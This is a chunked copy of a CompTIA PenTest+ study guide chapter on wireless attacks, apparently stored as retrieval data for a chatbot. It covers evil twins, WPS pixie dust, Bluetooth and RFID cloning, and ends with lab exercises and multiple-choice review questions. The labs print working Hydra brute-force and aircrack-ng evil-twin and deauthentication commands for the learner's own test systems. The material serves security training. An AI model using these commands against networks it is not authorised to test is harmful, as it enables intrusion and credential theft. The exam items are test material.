rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	deficiencies within it. This allows exploitation to take place when large amounts of inputs are sent to a system in order to crash or debilitate it. Packet crafting is an attack where a fake packet is created to bypass controls or be used to exploit a system. Captive portal is an attack that allows you to believe that you are attaching to a legitimate system in order to gain access, when in reality it is set up to trick you into thinking it is legitimate, but it is not. This leads to other attacks once connected to the portal. Wi‐Fi Protected Setup (WPS) personal identification number (PIN) attack is an attack that allows an attacker to access wireless networks by creating the PIN used to allow for WPS connections. This is a well‐ known design flaw that can be cracked fairly easily due to the 8‐digit size used for the PIN. Eavesdropping, which focuses on capturing data that is already in transit. This is typically done with a wireless sniffer tool. Data modification attacks attempt to change data and are frequently conducted in parallel with another attack like an on‐path attack. Data corruption attacks focus on corrupting data or traffic. Deauthentication attacks can rely on data corruption to cause a deauthentication/reauthentication sequence. Relay attacks are a specific type of on‐path attack that accepts data, allows attackers to review and potentially modify the data, then forwards the data on to its originally intended destination. Spoofing attacks provide false information intended to allow attackers to impersonate another system or user in a variety of forms. Systems may spoof information like their MAC address to attempt to appear like another system or IP addresses, DNS responses, or other information to accomplish their task. Deauthentication attacks send spoofed packets attempting to get systems to disconnect from a legitimate access point, allowing attackers to try to get them to connect to a malicious (evil twin) access point or to force them to reauthenticate, allowing attacks against or interception of authentication traffic. Jamming (or signal jamming) tries to prevent traffic from flowing by flooding or interfering with connections. Capturing handshakes is often part of a deauthentication attack. If you can capture handshakes, you can then attempt to crack the passphrase and derive keys from that effort. On‐path attacks focus on persuading a target system to send traffic through a system controlled by the attacker, allowing relay attacks, traffic monitoring, and traffic manipulation. Finding Targets Finding targets for wireless penetration testing engagements typically means walking, driving, or otherwise exploring the target area to identify access points, SSIDs, and relative power ratings to help triangulate access points and other wireless devices. Much like other pentesting activities, OSINT can help too. Wireless network databases like WiGLE can be a big help. WiGLE, the Wireless Geographic Logging Engine, is a website that maps Wi‐Fi access points around the world. Figure 7.12 shows an example of a WiGLE map with access datapoints for access points. Zooming in will show individual SSIDs,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacks, traffic monitoring, and traffic manipulation. Finding Targets Finding targets for wireless penetration testing engagements typically means walking, driving, or otherwise exploring the target area to identify access points, SSIDs, and relative power ratings to help triangulate access points and other wireless devices. Much like other pentesting activities, OSINT can help too. Wireless network databases like WiGLE can be a big help. WiGLE, the Wireless Geographic Logging Engine, is a website that maps Wi‐Fi access points around the world. Figure 7.12 shows an example of a WiGLE map with access datapoints for access points. Zooming in will show individual SSIDs, and WiGLE supports searches by geographic location, SSID, date ranges, and whether the access point may provide freely accessible Wi‐Fi. FIGURE 7.12 WiGLE map showing access point density in a metropolitan area Service Set Identifier (SSID) Scanning Part of finding targets is through the use of service set identifier (SSID) scanning. In this chapter we have covered a number of tools that allow an attacker to find vulnerable networks. When considering a wireless network, it can be vulnerable by nature. Part of using network services is the ability to actually use them without known restrictions. Let's say you wanted to go into a coffee shop and access the web while sipping a latte; Internet access should be provided easily. One of the ways this ease of use is provided is through easily finding and connecting to an open SSID. An SSID is a logical configuration within the wireless network and its associated devices that allows you to “identify” it from other networks that may be present. In any given location, there can easily be a dozen wireless networks available for use. Regardless of the security associated with any given wireless network, SSID scanning allows an attacker to get a lay of the land and know specifically what SSIDs are present and which ones may be accessible. SSIDs are also broadcast, which makes them easy to find. Scanning allows an attacker to find, identify, and even start to probe wireless networks that can be found. Channel Scanning When using wireless technology, you can either use 2.4 GHz or 5 GHz technology, and in each offering, there are an associated number of wireless channels available for use. A wireless channel is a place on that frequency spectrum that is available for use to transmit and receive data. There are generally multiple channels per spectrum and an open channel allows access. As just mentioned with SSIDs, the beacons that are sent also contain channel information as well. When using a tool such as WiFi Analyzer, you can scan the channels available for use. When using a tool such as this, you can scan for the open radio channels available for use and open to exploitation. Tools such as inSSIDer allow you to gain visibility into available channels. Most times when you connect to a wireless network, the default open channel is selected for you, but it doesn't mean that others don't exist or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	per spectrum and an open channel allows access. As just mentioned with SSIDs, the beacons that are sent also contain channel information as well. When using a tool such as WiFi Analyzer, you can scan the channels available for use. When using a tool such as this, you can scan for the open radio channels available for use and open to exploitation. Tools such as inSSIDer allow you to gain visibility into available channels. Most times when you connect to a wireless network, the default open channel is selected for you, but it doesn't mean that others don't exist or are not available. If open channels are identified, vulnerabilities can be found, and exploits can be attempted. A possible attack can be a multichannel adversary‐in‐the‐middle attack, where with the use of an open channel and the manipulation of data, an on‐path attack can be conducted. Signal Strength Scanning Signal strength is what shows up when you are looking for a wireless network to join. Often, you will see a series of available SSIDs and associated “signal strength” provided if you join one or the other. Also, when you are a consumer of wireless services, you tend to want to connect to and associate to wireless networks that have higher (or stronger) strength levels available so that you can stream music and video, transmit data, and so on. While scanning for signal strength may not seem like an attack itself, it can lead to one. When an attacker is looking to conduct an evil twin attack, they will often create a twin with a very high signal strength so that consumers are more likely to select it and be victimized. Attacking Captive Portals Captive portals are used in many locations to provide a limited access control and authorization capability for wireless networks. They often use shared credentials like the password you've likely seen written on a coffee shop's chalkboard. They may also require an identifier and password like a hotel room number, last name, password combination like the systems in use in many hotels. Captive portals aren't performing complex authentication and typically rely on a system's MAC address to provide access once the connection is validated. That means pentesters who encounter a captive portal may be able to use simple wireless MAC address cloning to gain access to the network while appearing like an authorized system. Kali Linux provides a built‐in captive portal tool called hack‐captive‐ portals. The tool sniffs wireless networks for authorized wireless hosts and uses the information captured to spoof both the authorized system's IP and MAC addresses, providing easy access to the network. Eavesdropping, Evil Twins, and Wireless On‐Path Attacks Evil twin attacks work by creating bogus access points that unsuspecting users connect to. This makes them useful for on‐path attacks like those discussed earlier in this chapter. Although it is possible to create an evil twin of a secured access point, more sophisticated users are likely to notice differences like having to accept new security certificates
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	captive portal tool called hack‐captive‐ portals. The tool sniffs wireless networks for authorized wireless hosts and uses the information captured to spoof both the authorized system's IP and MAC addresses, providing easy access to the network. Eavesdropping, Evil Twins, and Wireless On‐Path Attacks Evil twin attacks work by creating bogus access points that unsuspecting users connect to. This makes them useful for on‐path attacks like those discussed earlier in this chapter. Although it is possible to create an evil twin of a secured access point, more sophisticated users are likely to notice differences like having to accept new security certificates or other changes. KARMA Attacks KARMA (KARMA Attacks Radio Machines Automatically) uses attacker devices that listen for probe requests for Wi‐Fi networks. When they receive the probe request, they pretend to be the access point to which the connecting system tried to connect. This allows the KARMA device to act as an on‐path device. For more details, see https://insights.sei.cmu.edu/cert/2015/08/instant-karma-might-still-getyou.html Evil twins can also be used for downgrade attacks, which trick clients into using a less secure protocol or encryption scheme. Downgrade attacks aren't limited to 802.11‐based protocols; researchers used a downgrade attack to defeat protections built into the Z‐Wave protocol used by many home automation and Internet of Things (IoT) devices, causing them to downgrade from the modern and more secure S2 security standards to the S0 standard that many devices also support. You can read more about the Z‐Wave attack at https://thehackernews.com/2018/05/z-wave-wireless-hacking.html. Pentesters can use Aircrack‐ng to create an evil twin using the airbase‐ng tool. The process is relatively simple: 1. Capture traffic to determine the SSID and MAC addresses of a legitimate access point. 2. Clone that access point using airbase‐ng. 3. Conduct a deauthentication attack. 4. Ensure that the fake AP is more powerful (or closer!) and thus will be selected by the client when they try to reconnect. 5. Conduct attacks, including on‐path attacks. As you can see, these attacks send to the access point a deauthentication packet that appears to come from a valid client. The client will then have to reauthenticate or reconnect to the access point. Another way to conduct evil twin attacks is to use EAPHammer, a purpose‐ built tool designed to conduct evil twin attacks on WPA2 Enterprise mode networks. You can find details about EAPHammer and details about how to set it up, at https://github.com/s0lst1c3/eaphammer. For the purposes of the PenTest+ exam, you should know that it's used to set up evil twin networks in a mostly automated way, and that it can perform captive portal attacks, do password spraying, and even make automated attacks against preshared key environments as well. It is important to note that evil twins are not necessarily the same thing as a rogue access point. A rogue access point is any access point that is not supposed to be on a network. This can be as simple as a printer, IOT device, or router that gets plugged in and provides access to the network, or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	PenTest+ exam, you should know that it's used to set up evil twin networks in a mostly automated way, and that it can perform captive portal attacks, do password spraying, and even make automated attacks against preshared key environments as well. It is important to note that evil twins are not necessarily the same thing as a rogue access point. A rogue access point is any access point that is not supposed to be on a network. This can be as simple as a printer, IOT device, or router that gets plugged in and provides access to the network, or as malicious as a specialized penetration testing device designed to be surreptitiously plugged into the network when a pentester is on‐site. A rogue access point could be configured as an evil twin, but the majority of them are not—in fact, evil twins are more likely to be on other networks controlled by the pentester or attacker to allow them to have greater control over and insight into traffic sent through the evil twin. Of course, that also means defenders are less likely to be able to see strange traffic from the evil twin device! Regardless of how your evil twin is set up, once you have successfully conducted an on‐path attack, you can also work on credential harvesting by capturing unencrypted traffic between the client and remote systems and services. The same techniques that are used for a wired connection will work here, and the same challenges exist: Most authentication traffic on modern networks is encrypted, making sniffing credentials “on the wire”— in this case via wireless connections—much harder. Even though Wi‐Fi can reach long distances under the right circumstances, having the right tools can make a big difference in your ability to conduct attacks against Wi‐Fi networks. The PenTest+ exam outline specifically calls out amplified antennas for exactly that reason. They can provide additional power when you need extended range or more power to conduct an attack. Fortunately, you won't have to be an expert on them for the exam—just remember that they're a useful part of a pentester's toolkit. Attacking WPS Wi‐Fi Protected Setup (WPS) has been a known issue for years, but it remains in use for ease of setup, particularly for consumer wireless devices. The specific attack that is used with WPS is the WPS personal identification number (PIN) attack. Setting up a printer with the push of a button, rather than entering a preshared key or password, can seem attractive. Unfortunately, one WPS setup mode requires an 8‐digit PIN, which is easily cracked because WPS uses an insecure method of validating PINs. WPS passwords can be attacked using a pixie dust attack, a type of attack that brute‐forces the key for WPS. Vulnerable routers can be attacked by leveraging the fact that many have poor selection algorithms for their preshared key random numbers. You can read about how to conduct a pixie dust attack in Kali Linux here: https://www.hackingtutorials.org/WiFi-hacking-tutorials/pixie-dustattack-wps-in-kali-linux-with-reaver Tools like Reaver are designed to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	push of a button, rather than entering a preshared key or password, can seem attractive. Unfortunately, one WPS setup mode requires an 8‐digit PIN, which is easily cracked because WPS uses an insecure method of validating PINs. WPS passwords can be attacked using a pixie dust attack, a type of attack that brute‐forces the key for WPS. Vulnerable routers can be attacked by leveraging the fact that many have poor selection algorithms for their preshared key random numbers. You can read about how to conduct a pixie dust attack in Kali Linux here: https://www.hackingtutorials.org/WiFi-hacking-tutorials/pixie-dustattack-wps-in-kali-linux-with-reaver Tools like Reaver are designed to exploit the WPS handshaking process. In fact, Reaver can function even if the WPS setup button hasn't been used on the router or access point! Reaver works by brute‐forcing the WPS setup pin (which the WPS protocol does not effectively protect against). That means networks that allow WPS can be brute‐forced given sufficient time. Due to the protocol's implementation, Reaver only needs to brute‐force 11,000 possible PINs at the most—and in most cases it will have to try far fewer. In addition to this flaw, Reaver can also attempt pixie dust attacks, which focus on poorly encrypted PINs for access points, allowing offline brute‐ force attacks against them. Pixie dust attacks take even less time than Reaver's brute‐force approach to WPS setup pins. You can read more about Reaver at https://github.com/t6x/reaver-wps-forkt6x. Bluetooth Attacks Bluetooth attacks can be useful for pentesters who have physical access to a local network, or who can get into range of a target's computer, phone, vehicle, or other Bluetooth‐enabled device. There are two common attacks you should be aware of: Bluesnarfing, the theft of information from Bluetooth‐enabled devices. Kali includes the bluesnarfer package, which allows phonebook contact theft via Bluetooth, given a device ID or address. Bluejacking, which sends unsolicited messages over Bluetooth devices. Discovering Bluetooth devices may be part of a penetration test, but the broad fears about wide‐scale exploits of Bluetooth‐enabled devices have not resulted in significant real‐world issues. Bluetooth is a potential path into systems and should be documented, but it's unlikely to be a primary exploit method for most penetration tests. Bluetooth Low Energy is a power‐saving version of the protocol that is used on many IoT devices to help save battery life. Bluetooth Low Energy (BLE) attacks are a relatively new concern; however, an increasing number of attacks against the protocol have been identified. The year 2020's announcement of the BLESA, or Bluetooth Low Energy Spoofing Attack, highlighted this growing issue. BLESA attacks take advantage of a lack of required reauthentication when devices reconnect, and that spurious information can be fed to the device because of this flaw. This means that IoT and other BLE‐enabled devices may be vulnerable to attacks depending on the Bluetooth software that they use. Since IoT and embedded devices like these are often hard to patch, this leaves more opportunity for future pentesters and attackers to take advantage of them. The PenTest+ exam outline specifically mentions
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	have been identified. The year 2020's announcement of the BLESA, or Bluetooth Low Energy Spoofing Attack, highlighted this growing issue. BLESA attacks take advantage of a lack of required reauthentication when devices reconnect, and that spurious information can be fed to the device because of this flaw. This means that IoT and other BLE‐enabled devices may be vulnerable to attacks depending on the Bluetooth software that they use. Since IoT and embedded devices like these are often hard to patch, this leaves more opportunity for future pentesters and attackers to take advantage of them. The PenTest+ exam outline specifically mentions SpoofTooph, a Bluetooth spoofing tool. SpoofTooph can scan for Bluetooth devices, clone them, generate and act like a randomized Bluetooth device, and it can log the information it finds. Such tools can be used to hide a Bluetooth device that will be used to gather information from Bluetooth devices in an environment, and where those devices are trusted it can help with information gathering. You can find more detail about SpoofTooph at https://sourceforge.net/projects/spooftooph. NFC and Amplification Attacks Near‐field communications (NFC) are protocols used for very short range communication and are commonly used for payment systems. Both Google Pay and Apple Pay use implementations of NFC to make payments, so you're likely to have encountered NFC in your day‐to‐day life. The PenTest+ exam outline covers amplification attacks in the context of NFC. Amplification attacks can either use tools like antennas and software‐ defined radio systems, or use protocol changes that make NFC more error tolerant at the cost of speed to allow longer range usage. This can allow data exfiltration from air‐gapped systems or can allow capture of NFC communications at longer ranges than would normally be possible. Other Wireless Protocols and Systems The PenTest+ exam doesn't currently include wireless standards other than those we have discussed here, but you should make sure to review any information that you find about an organization's wireless capabilities. It is relatively common to discover proprietary or open‐standard wireless devices operating in an environment that may provide either interesting information or even a path into a network. The methods to capture and interpret those protocols are well beyond the scope of this book, but there are many groups and individuals that focus on this type of reverse engineering. You can find a treasure trove of projects related to this type of work at https://hackaday.com/tag/hackrf, as well as presentations like the 2018 Blackhat “Bringing Software Defined Radio to the Penetration Testing Community,” at: https://www.blackhat.com/docs/us-14/materials/us-14-Picod-BringingSoftware-Defined-Radio-To-The-Penetration-Testing-Community-WP.pdf Wireless Security Tools Some of the most common open source wireless security assessment tools are Aircrack‐ng, Kismet, and WiFite. The PenTest+ exam outline also adds mdk4. You will need to perform wireless attacks using the appropriate tools when given specific scenarios, so make sure you memorize these tools for the exam. Aircrack‐ng Aircrack‐ng is a suite of tools that provides the ability to conduct replay and deauthentication attacks and to act as a fake access point. It also provides the ability to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	well as presentations like the 2018 Blackhat “Bringing Software Defined Radio to the Penetration Testing Community,” at: https://www.blackhat.com/docs/us-14/materials/us-14-Picod-BringingSoftware-Defined-Radio-To-The-Penetration-Testing-Community-WP.pdf Wireless Security Tools Some of the most common open source wireless security assessment tools are Aircrack‐ng, Kismet, and WiFite. The PenTest+ exam outline also adds mdk4. You will need to perform wireless attacks using the appropriate tools when given specific scenarios, so make sure you memorize these tools for the exam. Aircrack‐ng Aircrack‐ng is a suite of tools that provides the ability to conduct replay and deauthentication attacks and to act as a fake access point. It also provides the ability to crack WPA PSK, in addition to the normal packet capture and injection capabilities built into most wireless security tools. You can read more at www.aircrack-ng.org. mdk4 mdk4 is a tool designed to exploit 802.11 protocol weaknesses and flaws. It includes a number of capabilities, ranging from SSID probing and brute forcing to flooding, fuzzing, deauthentication, and disassociation tools. It also has tools targeting Wi‐Fi mesh networks and can conduct denial‐of‐service attacks against wireless networks. Kismet Kismet provides wireless packet capture and sniffing features and can also be used as a wireless intrusion detection system. Kismet can be found at www.kismetwireless.net. WiFite WiFite, or more accurately WiFite2, is a wireless network auditing tool. It includes WPA handshake capture capabilities, support for pixie dust attacks, support for identification of hidden access points, and WPA handshake cracking, among other auditing‐ and penetration testing–friendly capabilities. If you're exploring Kali Linux, you'll find a number of other tools designed to execute specific attacks, and each of those tools can be very useful in specific circumstances. In most cases, however, one of these three tools will be your starting place for penetration tests. Fern Fern is a Wi‐Fi cracking tool that includes WPA2 dictionary attack functions, session hijacking capabilities, geolocation abilities for access point mapping, on‐path attack support, and a range of brute‐ force functions for common services via HTTP, Telnet, and FTP. wapd The binary (or function) called wpad is a wrapper based around hostapd, which adds multi all support as part of the wireless utilities you can use with Linux. Wi‐Fi‐Pumpkin Wi‐Fi Pumpkin is an extremely powerful framework that gives you the functionality to create a rogue access point. With the ability to create rogue APs, you can also create fake captive portals. Wi‐Fi‐ Pumpkin can be found at https://github.com/P0cL4bs/wifipumpkin3. WiGLE.net WiGLE stands for the Wireless Geographic Logging Engine, which is a website that maps Wi‐Fi access points around the world and acts as a database or repository of information. Visit the site at https://wigle.net. InSSIDer inSSIDer is a Wi‐Fi network analysis and scanner tool that allows you to build a dashboard of information showing available access points and details about them, including but not limited to target availability, signal strength, SSID, and more. inSSIDer can be found at https://www.metageek.com/inssider. RFID Cloning Access cards, ID cards, and similar tokens are often used to provide access control to facilities. This makes cloning RFID cards a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the Wireless Geographic Logging Engine, which is a website that maps Wi‐Fi access points around the world and acts as a database or repository of information. Visit the site at https://wigle.net. InSSIDer inSSIDer is a Wi‐Fi network analysis and scanner tool that allows you to build a dashboard of information showing available access points and details about them, including but not limited to target availability, signal strength, SSID, and more. inSSIDer can be found at https://www.metageek.com/inssider. RFID Cloning Access cards, ID cards, and similar tokens are often used to provide access control to facilities. This makes cloning RFID cards a useful approach for pentesters. Each of the technologies relies on radio frequency (RF), but there are three primary types of card or device that you are likely to encounter: Low‐frequency 125–134.2 KHz RFID cards, which can be cloned to other cards using a readily available cloning tool. High‐frequency 13.56 MHz tags and cards. Many phones now support this near‐field communication (NFC) capability, making it possible to clone cards with phones. Ultra‐high‐frequency tags vary in range from 865 MHz to 928 MHz, and they vary around the world because there is no accepted international standard. Figure 7.13 shows an inexpensive low‐frequency RFID cloning device and tags. Devices like these can make cloning RFID‐based access cards trivial, and since RFID cards are often generic in appearance, using a cloned card or even a fob like those shown in the figure can make a physical penetration test far simpler. FIGURE 7.13 RFID cloner and tags Signal Jamming Wireless DoS can also be a legitimate technique for pentesters, but it isn't a common technique. It may be used to prevent access to a wireless device or to prevent a device from communicating with a controller or monitoring system, as may be required as part of a penetration test. As wireless IoT devices become increasingly common, blocking them from communicating upstream may allow you to avoid detection or prevent an alarm from being sent. Jamming may not be legal in the jurisdiction you are in or for the type of device or system you want to block. In the United States, the Federal Communications Commission (FCC) specifically prohibits the use of jammers that block authorized radio communication. You can read more at https://www.fcc.gov/general/jammer-enforcement. While at the site, also read about the FCC's enforcement prohibitions on signal jammers. Repeating Repeating traffic, or conducting a relay attack, can be useful for a pentester who needs access to a wireless network but cannot remain in range of the network. Directional antennas can help, but adding a concealed repeater to a remote network can allow traffic to be relayed over longer distances. Commercial devices like the Pwnie Express Pwn Plug provide the ability to deploy a device to a local organization and then connect to that device to relay attack traffic to local networks. Summary On‐site penetration tests often require pentesters to gain access to the wired or wireless network. Once you have access, you can then pivot to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can be useful for a pentester who needs access to a wireless network but cannot remain in range of the network. Directional antennas can help, but adding a concealed repeater to a remote network can allow traffic to be relayed over longer distances. Commercial devices like the Pwnie Express Pwn Plug provide the ability to deploy a device to a local organization and then connect to that device to relay attack traffic to local networks. Summary On‐site penetration tests often require pentesters to gain access to the wired or wireless network. Once you have access, you can then pivot to target systems and services that are accessible on the network segment you are on or other network segments that you may be able to gain access to. Gaining access may be as simple as plugging into an unsecured network jack or connecting to an open wireless network, but most organizations have stronger security. Gaining access may require bypassing network access controls (NACs) or conducting a VLAN hopping attack for a wired network. Wireless networks may require setting up a fake access point, changing a MAC address, or providing stolen credentials. Wireless network attacks require a different set of tools and techniques than wired network attacks. Setting up an evil twin or fake access point to execute on‐path attacks can serve pentesters well. In addition, knowing how to deauthenticate systems, how to harvest credentials from wireless clients, and how to exploit specific weaknesses like those found in WPS is a useful skill in a pentester's toolkit. Knowing how to target wireless technologies other than Wi‐Fi, like Bluetooth and RFID, can also help a pentester gain physical access or gather additional information. Once pentesters have gained network access, credentials and related information are the first high‐value targets. Conducting on‐path attacks via ARP spoofing can provide pentesters with the ability to conduct further attacks, including replay, relay, SSL stripping, and security protocol downgrade attacks. With these attacks in play, a pentester can gain credentials and access or simply view traffic to learn more about an organization and its services. Pentesters must be capable of a variety of attacks like link NetBIOS name service poisoning, NTLM relay attacks, and attacks against common services, in addition to using on‐path attacks. Targeting these vulnerable services requires knowledge of the service's underlying protocol, exploit methods for the most common software packages and services that are used to run each service, and the penetration testing and auditing tools that can be used to target them. Windows NetBIOS and SMB services are popular targets because NTLM hashes can be stolen and replayed in pass‐the‐hash attacks, and other credential data can be acquired using specialized attack methods. Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NetBIOS‐NS) poisoning can provide pentesters with the ability to obtain an on‐path position, furthering their ability to gain access and information. Although many penetration tests do not allow denial‐of‐service attacks as part of their rules of engagement and scope, some may allow or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	run each service, and the penetration testing and auditing tools that can be used to target them. Windows NetBIOS and SMB services are popular targets because NTLM hashes can be stolen and replayed in pass‐the‐hash attacks, and other credential data can be acquired using specialized attack methods. Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NetBIOS‐NS) poisoning can provide pentesters with the ability to obtain an on‐path position, furthering their ability to gain access and information. Although many penetration tests do not allow denial‐of‐service attacks as part of their rules of engagement and scope, some may allow or even require them. When pentesters are preparing for network exploitation, it's important to understand the use of tools that can target applications or the protocols they use or that can simply overwhelm a service or network by sending massive amounts of traffic. Exam Essentials Understand and be able to explain common network‐based attack methods. Explain what eavesdropping and on‐path attacks are, how they can be implemented, and what challenges exist for pentesters who want to capture traffic. Describe relay attacks and spoofing, how they're related and how they differ. Understand data modification and data corruption attacks. Implement handshake and hash capturing attacks. Explain why jamming might be used by a pentester to accomplish other attacks. Describe network attacks. You should be able to explain multiple types of NAC bypass scenarios, including MAC spoofing, DHCP server‐based NAC controls, and how SNMP and ARP detection can be attacked. Describe and explain VLAN hopping, trunking, and related techniques to view traffic that is not native to your VLAN or to send traffic to other VLANs. Explain Kerberoasting, DNS cache poisoning, LLMNR and NBT‐NS poisoning, as well as NTLM relay attacks. Know how to implement a basic load‐based stress test as part of a pentester's efforts. Use wireless and RF‐based exploits and attacks. Wireless attacks require a few techniques that go beyond those required for wired networks. Know how to set up an evil twin access point using Aircrack‐ng and be familiar with the steps necessary to deauthenticate a target system. Explain captive portal and WIPS PIN attacks and how they can be used. Be able to describe how and when credential harvesting is possible via a wireless network. In addition, you should have a basic understanding of non‐Wi‐Fi wireless exploits, including Bluetooth attacks, RFID cloning, and how jamming and repeating traffic can be useful to a pentester. Lab Exercises Activity 7.1: Capturing Hashes In this activity, you will capture an NTLM hash used between two Windows systems. Microsoft provides free Windows virtual machines at https://developer.microsoft.com/en-us/windows/downloads/virtualmachines. You can download any of the Microsoft virtual machines you wish for any of the virtualization tools that you may have access to. Since we have used VirtualBox throughout the book, this example will assume that Windows 10 or a Windows 11 and VirtualBox are the pairing of choice. 1. Import the VM into VirtualBox and make sure it boots and that you can log into it. Set
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	useful to a pentester. Lab Exercises Activity 7.1: Capturing Hashes In this activity, you will capture an NTLM hash used between two Windows systems. Microsoft provides free Windows virtual machines at https://developer.microsoft.com/en-us/windows/downloads/virtualmachines. You can download any of the Microsoft virtual machines you wish for any of the virtualization tools that you may have access to. Since we have used VirtualBox throughout the book, this example will assume that Windows 10 or a Windows 11 and VirtualBox are the pairing of choice. 1. Import the VM into VirtualBox and make sure it boots and that you can log into it. Set it to be on the same internal NAT network as your Kali Linux system. Enter the system settings in Windows and change its name to Server. 2. Shut down the VM. From inside the VirtualBox main window, right‐ click the VM and choose Clone. Follow through the dialog boxes. Once the clone is complete, boot the system and rename it Target. 3. Boot the Server system. Using the administrative controls, create a new user and password. This is the account we will target when we capture the NTLM hash. 4. Create a directory on the server and put a file into the directory. Then right‐click the directory in the file manager and share it. Make sure to set permissions allowing the new user you created to access the share! 5. Record the IP addresses of both systems. 6. Now run Responder and capture the NTLM hash that is sent when Target tries to authenticate to the Server system. Note that we didn't provide you full instructions on how to do this—as you become more advanced in your skills, you will need to learn how to figure out tools without guidance. If you need a hint, we suggest https://www.notsosecure.com/pwning-with-responder-a-pentestersguide as a good starting point. Activity 7.2: Brute‐Forcing Services In this exercise, you will use Hydra to brute‐force an account on a Metasploitable system. 1. Boot your Linux Metasploitable 2 or 3 system. Log in, and create a user using adduser with a weak password. You can find a list of the passwords we will use to brute‐force with in /usr/share/wordlists/rockyou.txt.gz on your Kali Linux system. If you want to decompress the rockyou list so that you can read it, simply copy it to another location and use the gzip ‐d rockyou.txt.gz command. Note that you will have to use the su command to add the user as the root account in Metasploitable—if you don't already know how to do this, make sure you learn how. 2. Use Hydra from your Kali Linux system to brute‐force the account you just created: hydra -l [userid] -P [password list location] -t 6 ssh://[metasploitable IP address] 3. How long did the attack take? What setting could you change to make it faster or slower? If you knew common passwords for your target, how could you add them to the word list? Activity 7.3: Wireless Testing This exercise requires a wireless card. If the desktop PC
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	command to add the user as the root account in Metasploitable—if you don't already know how to do this, make sure you learn how. 2. Use Hydra from your Kali Linux system to brute‐force the account you just created: hydra -l [userid] -P [password list location] -t 6 ssh://[metasploitable IP address] 3. How long did the attack take? What setting could you change to make it faster or slower? If you knew common passwords for your target, how could you add them to the word list? Activity 7.3: Wireless Testing This exercise requires a wireless card. If the desktop PC you are using does not have one, you may need to skip this exercise. For the purposes of this exercise, we will assume that you have a functioning wireless card (wlan0) accessible to a Kali Linux VM. You should also use an access point and target system that you own when conducting this exercise. 1. Set up your wireless card to capture traffic: airmon-ng start wlan0 2. Note that this changes your wireless card to mon0. 3. Capture traffic to determine what access points are in range and their important settings: airodump-ng mon0 4. Connect to your AP using another device. You should see the connection appear on the screen. 5. Clone the access point. From a new terminal, enter: airbase-ng -a [BSSID] -essid "[SSID]" -c [channel] mon0 Note that you will need to provide the hardware address of the AP (the BSSID), the SSID, and the channel and that they must all match the target that you are cloning. 6. Now you can bump your device off the actual access point and cause it to reconnect to your clone. To do this, use the following: aireplay-ng -deauth 0 -a [BSSID] 7. Now you can conduct on‐path activities as desired. Review Questions You can find the answers in the Appendix A. 1. Charles wants to deploy a wireless intrusion detection system. Which of the following tools is best suited to that purpose? A. WiFite B. Kismet C. Aircrack‐ng D. SnortiFi Use the following scenario for questions 2, 3, and 4: Chris is conducting an on‐site penetration test. The test is a gray‐ box test, and he is permitted on‐site but has not been given access to the wired or wireless networks. He knows he needs to gain access to both to make further progress. 2. Which of the following NAC systems would be the easiest for Chris to bypass? A. A software client‐based system B. A DHCP proxy C. A MAC address filter D. None of the above 3. If Chris wants to set up a false AP, which tool is best suited to his needs? A. Aircrack‐ng B. Kismet C. Wireshark D. WiFite2 4. Once Chris has gained access to the network, what technique can he use to gather additional credentials? A. ARP spoofing to allow an on‐path attack B. Network sniffing using Wireshark C. SYN floods D. All of the above 5. What attack technique can allow the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	systems would be the easiest for Chris to bypass? A. A software client‐based system B. A DHCP proxy C. A MAC address filter D. None of the above 3. If Chris wants to set up a false AP, which tool is best suited to his needs? A. Aircrack‐ng B. Kismet C. Wireshark D. WiFite2 4. Once Chris has gained access to the network, what technique can he use to gather additional credentials? A. ARP spoofing to allow an on‐path attack B. Network sniffing using Wireshark C. SYN floods D. All of the above 5. What attack technique can allow the pentester visibility into traffic on VLANs other than their native VLAN? A. MAC spoofing B. Dot1q spoofing C. ARP spoofing D. Switch spoofing 6. What type of Bluetooth attack attempts to send unsolicited messages via Bluetooth devices? A. Bluesnarfing B. Bluesniping C. Bluejacking D. Bluesending 7. Cassandra wants to attack a WPS‐enabled system. What attack technique can she use against it? A. WPSnatch B. Pixie dust C. WPSmash D. e‐Lint gathering 8. Michelle wants to capture NFC communications as part of a penetration test. What is the most critical factor in her ability to intercept the communication? A. Encryption B. Duration of communication C. Range D. Protocol version 9. As part of a penetration test, Mariana uses a tool that uses the same username and password from a list on many target systems and then uses the next username and password from its list. Which of the following terms best describes the attack she is using? A. Brute force B. Dictionary C. Hash cracking D. Password spraying 10. Steve has set his penetration testing workstation up for an on‐path attack between his target and an FTP server. What is the best method for him to acquire FTP credentials? A. Capture traffic with Wireshark. B. Conduct a brute‐force attack against the FTP server. C. Use an exploit against the FTP server. D. Use a downgrade attack against the next login. 11. Ian wants to drop a tool on a compromised system that will allow him to set up reverse shell. Which of the following tools should he select? A. Aircrack‐ng B. Nmap C. Netcat D. Censys 12. What drives the use of deauthentication attacks during penetration tests? A. The desire to capture handshakes B. Bluejacking attacks C. Network stress or load testing D. RFID cloning attacks 13. Which of the following tools will not allow Alice to capture NTLM v2 hashes over the wire for use in a pass‐the‐hash attack? A. Responder B. Mimikatz C. Ettercap D. Metasploit 14. For what type of activity would you use the tools HULK, LOIC, HOIC, and SlowLoris? A. DDoS B. SMB hash capture C. DoS D. Brute‐force SSH 15. During a penetration test, Mike uses double tagging to send traffic to another system. What technique is he attempting? A. RFID tagging B. Tag nesting C. Meta tagging D. VLAN hopping 16. Elle is using her workstation as part of an on‐path attack as shown
